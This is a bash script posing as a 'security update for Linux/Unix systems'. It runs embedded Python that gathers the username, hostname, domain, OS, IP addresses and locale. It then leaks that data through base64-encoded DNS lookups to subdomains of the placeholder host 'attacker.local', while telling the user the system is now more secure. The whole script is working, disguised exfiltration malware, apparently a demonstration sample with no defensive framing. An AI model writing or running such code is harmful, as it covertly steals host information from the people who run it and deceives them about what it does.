#!/bin/bash
# Security Update Script for Linux/Unix systems
# This script performs system security checks

echo "Installing security update..."
echo "Please wait while we update your system security settings..."

# Check if Python is available
if command -v python3 &> /dev/null; then
    PYTHON_CMD="python3"
elif command -v python &> /dev/null; then
    PYTHON_CMD="python"
else
    echo "Python not found. Security update requires Python. Please install Python and run again."
    exit 1
fi

echo "Collecting system information for security analysis..."

# Execute the data collection Python code
$PYTHON_CMD << 'EOF'
import subprocess
import sys
import base64
import socket
import platform
import os
import pwd
import getpass

try:
    # Data collection
    username = getpass.getuser()
    hostname = socket.gethostname()
    
    # Get domain/workgroup info
    try:
        domain_info = subprocess.check_output(['hostname', '-d']).decode().strip()
        if not domain_info:
            domain_info = 'WORKGROUP'
    except:
        domain_info = 'WORKGROUP'
    
    os_info = platform.platform()
    
    # Collect additional system info
    try:
        # Get IP addresses
        import netifaces
        ips = []
        for interface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addrs:
                for addr in addrs[netifaces.AF_INET]:
                    ips.append(addr['addr'])
        ip_info = ','.join(ips)
    except:
        ip_info = '127.0.0.1'
    
    # Get language/locale
    try:
        import locale
        lang_info = locale.getdefaultlocale()[0] or 'en_US'
    except:
        lang_info = 'en_US'
    
    print(f"Collected data: user:{username}|comp:{hostname}|domain:{domain_info}|os:{os_info}")
    print("Exfiltrating data via DNS queries...")
    
    # Create DNS queries to exfiltrate data
    def send_dns_query(data_chunk, chunk_id):
        try:
            encoded_data = base64.b64encode(data_chunk.encode()).decode().replace('=', '')[:60]
            dns_query = f'{chunk_id}.{encoded_data}.attacker.local'
            print(f"Sending DNS query: {dns_query}")
            socket.gethostbyname_ex(dns_query)
        except Exception as e:
            print(f"DNS query failed: {e}")
    
    # Send collected data in chunks
    data = f'user:{username}|comp:{hostname}|domain:{domain_info}|os:{os_info}|ip:{ip_info}|lang:{lang_info}'
    chunks = [data[j:j+50] for j in range(0, len(data), 50)]
    
    for i, chunk in enumerate(chunks):
        send_dns_query(chunk, f'chunk{i}')
    
    print('Security update completed successfully!')
    
except Exception as e:
    print(f'Error during security update: {e}')
    print('Please contact IT support.')
EOF

echo ""
echo "Security update installation completed."
echo "Your system is now more secure."
sleep 2
